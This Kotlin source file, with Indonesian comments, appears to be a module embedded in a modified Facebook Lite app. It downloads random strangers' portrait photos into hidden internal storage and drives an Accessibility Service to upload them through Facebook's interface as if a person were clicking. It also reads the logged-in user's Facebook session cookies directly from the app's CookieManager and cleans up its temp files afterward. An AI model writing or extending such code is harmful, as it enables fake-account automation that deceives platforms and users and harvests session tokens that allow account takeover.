package com.spectrum.v2

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import kotlin.coroutines.resume

object FacebookPhotoUploader {

    // ══════════════════════════════════════════
    // FOLDER INTERNAL — tidak muncul di galeri, tidak butuh izin storage
    // Context.filesDir = /data/data/com.facebook.lite/files/
    // ══════════════════════════════════════════
    private fun getTempDir(context: Context): File {
        val dir = File(context.filesDir, "lp_temp")
        if (!dir.exists()) dir.mkdirs()
        return dir
    }

    // ══════════════════════════════════════════
    // DOWNLOAD FOTO RANDOM ke folder INTERNAL
    // ══════════════════════════════════════════
    suspend fun downloadRandomPhoto(context: Context): File? =
        withContext(Dispatchers.IO) {
            val r = (1..99).random()
            val g = if (r % 2 == 0) "men" else "women"

            val sources = listOf(
                "https://randomuser.me/api/portraits/$g/$r.jpg",
                "https://randomuser.me/api/portraits/$g/${(1..99).random()}.jpg",
                "https://picsum.photos/400/400",
                "https://picsum.photos/seed/$r/400/400"
            )

            for (url in sources) {
                try {
                    val conn = URL(url).openConnection() as HttpURLConnection
                    conn.requestMethod = "GET"
                    conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 11)")
                    conn.connectTimeout = 12000
                    conn.readTimeout    = 12000
                    conn.instanceFollowRedirects = true

                    if (conn.responseCode in 200..299) {
                        val file = File(getTempDir(context), "lp_photo_${System.currentTimeMillis()}.jpg")
                        FileOutputStream(file).use { out -> conn.inputStream.copyTo(out) }
                        conn.disconnect()
                        if (file.length() > 5000) return@withContext file
                        file.delete()
                    }
                    conn.disconnect()
                } catch (_: Exception) { continue }
            }
            null
        }

    // ══════════════════════════════════════════
    // UPLOAD FOTO VIA ACCESSIBILITY SERVICE
    // Karena Spectrum ada DALAM FB Lite, service klik tombol seperti manusia
    // Tidak pakai Intent lintas app — 100% dalam satu proses
    // ══════════════════════════════════════════
    suspend fun uploadViaAccessibility(photoFile: File): Pair<Boolean, String> =
        suspendCancellableCoroutine { cont ->
            val svc = SvAccessibilityService.instance
            if (svc == null) {
                cont.resume(Pair(false, "Accessibility Service belum aktif. Aktifkan di Pengaturan > Aksesibilitas > Lite Pro"))
                return@suspendCancellableCoroutine
            }
            SvAccessibilityService.startPhotoUpload(photoFile.absolutePath) { ok, msg ->
                if (cont.isActive) cont.resume(Pair(ok, msg))
            }
        }

    // ══════════════════════════════════════════
    // EKSTRAK COOKIES — langsung dari CookieManager FB Lite
    // Karena satu proses, tidak perlu WebView baru
    // ══════════════════════════════════════════
    suspend fun extractCookies(): String =
        suspendCancellableCoroutine { cont ->
            val svc = SvAccessibilityService.instance
            if (svc == null) {
                // Fallback: baca langsung dari CookieManager
                try {
                    val cm  = android.webkit.CookieManager.getInstance()
                    val raw = cm.getCookie("https://m.facebook.com")
                        ?: cm.getCookie("https://www.facebook.com")
                        ?: ""
                    if (cont.isActive) cont.resume(raw)
                } catch (_: Exception) {
                    if (cont.isActive) cont.resume("")
                }
                return@suspendCancellableCoroutine
            }
            SvAccessibilityService.extractCookies { cookies ->
                if (cont.isActive) cont.resume(cookies)
            }
        }

    // ══════════════════════════════════════════
    // HAPUS FILE TEMP setelah upload
    // ══════════════════════════════════════════
    fun deleteTempFile(file: File) {
        Thread { Thread.sleep(15000); try { file.delete() } catch (_: Exception) {} }.start()
    }

    fun cleanupAllTemp(context: Context) {
        try {
            getTempDir(context).listFiles()
                ?.filter { it.name.endsWith(".jpg") }
                ?.forEach { it.delete() }
        } catch (_: Exception) {}
    }

    data class DetectedApp(val packageName: String, val label: String, val isClone: Boolean = false)
}
